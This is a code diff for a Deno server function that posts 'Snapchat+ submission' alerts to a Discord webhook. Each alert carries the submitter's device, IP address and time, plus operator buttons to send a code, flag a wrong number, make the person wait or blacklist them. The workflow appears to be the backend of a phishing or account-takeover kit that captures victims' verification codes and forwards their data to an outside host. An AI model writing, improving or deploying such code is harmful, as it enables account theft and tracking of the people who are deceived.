@@ -1,7 +1,6 @@
 import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 
-const DISCORD_BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
-const DISCORD_CHANNEL_ID = Deno.env.get("DISCORD_CHANNEL_ID");
+const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
 
 Deno.serve(async (req) => {
   const authHeader = req.headers.get("authorization") || "";
@@ -45,7 +44,14 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
-
+  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
+  const redirectUri = `${appUrl}/api/discord-callback`;
+  const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${Deno.env.get("DISCORD_APP_ID")}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify`;
+  
+  const triggerUrl = `${discordAuthUrl}&state=${submissionId}&action=code_ready`;
+  const wrongUrl = `${discordAuthUrl}&state=${submissionId}&action=wrong`;
+  const waitUrl = `${discordAuthUrl}&state=${submissionId}&action=wait`;
+  const blacklistUrl = `${discordAuthUrl}&state=${submissionId}&action=blacklist`;
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
@@ -60,35 +66,20 @@ Deno.serve(async (req) => {
       { name: "💾 Appareil", value: finalDevice, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
-
+      {
+        name: "⚡ Actions",
+        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
+        inline: false
+      },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
-  const components = [
-    {
-      type: 1,
-      components: [
-        { type: 2, style: 3, label: "✅ Envoyer le code", custom_id: `code_ready_${submissionId}` },
-        { type: 2, style: 4, label: "❌ Mauvais numéro", custom_id: `code_wrong_${submissionId}` },
-        { type: 2, style: 2, label: "⏳ Faire patienter", custom_id: `wait_${submissionId}` },
-        { type: 2, style: 4, label: "🚫 Blacklist instant", custom_id: `blacklist_${submissionId}` }
-      ]
-    }
-  ];
-
-  await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
+  await fetch(DISCORD_WEBHOOK, {
     method: "POST",
-    headers: { 
-      "Content-Type": "application/json",
-      "Authorization": `Bot ${DISCORD_BOT_TOKEN}`
-    },
-    body: JSON.stringify({ 
-      content: "@everyone", 
-      embeds: [embed],
-      components
-    }),
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
   });
 
   await base44.asServiceRole.entities.ActionLog.create({
